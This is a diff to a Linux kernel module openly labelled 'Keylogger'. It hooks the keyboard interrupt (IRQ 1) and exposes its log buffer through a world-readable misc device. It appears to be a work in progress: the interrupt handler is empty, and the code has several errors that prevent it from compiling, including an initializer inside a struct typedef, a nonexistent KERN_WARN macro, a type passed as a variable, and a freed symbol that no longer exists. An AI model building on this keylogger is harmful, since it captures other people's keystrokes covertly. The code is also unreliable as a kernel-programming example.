@@ -8,15 +8,18 @@
 #include <linux/miscdevice.h>
 #include <linux/uaccess.h>
 #include <linux/errno.h>
-#include <linux/string.h>
 #include <linux/vmalloc.h>
+#include <linux/interrupt.h>
 
 MODULE_AUTHOR("hsmits & sel-melc");
 MODULE_DESCRIPTION("Keylogger");
 MODULE_LICENSE("GPL");
 
 
-char *log_buffer = NULL;
+typedef struct keylogger_data
+{
+	char *log_buffer = NULL;
+}			   t_keylogger_data;
 
 /*
 *  Adds a new entry to the log_buffer.
@@ -59,15 +62,29 @@ static struct miscdevice misc_dev = {
 	.mode = 0666,
 };
 
+static irqreturn_t keylogger_handle(int irq_n, void *data)
+{
+	t_keylogger_data *logs = (t_keylogger_data *)data;
+
+	return IRQ_HANDLED;
+}
+
 static int __init init(void)
 {
 	misc_register(&misc_dev);
+
+	if (request_irq(1, keylogger_handle, IRQF_SHARED, "keylogger", &keylogger_data) < 0)
+	{
+		printk(KERN_WARN "Couldn't request interrupt.\n");
+		return (1);
+	}
 	return (0);
 }
 
 static void __exit cleanup(void)
 {
 	misc_deregister(&misc_dev);
+	free_irq(1, log_buffer);
 	if (log_buffer)
 		vfree(log_buffer);
 }
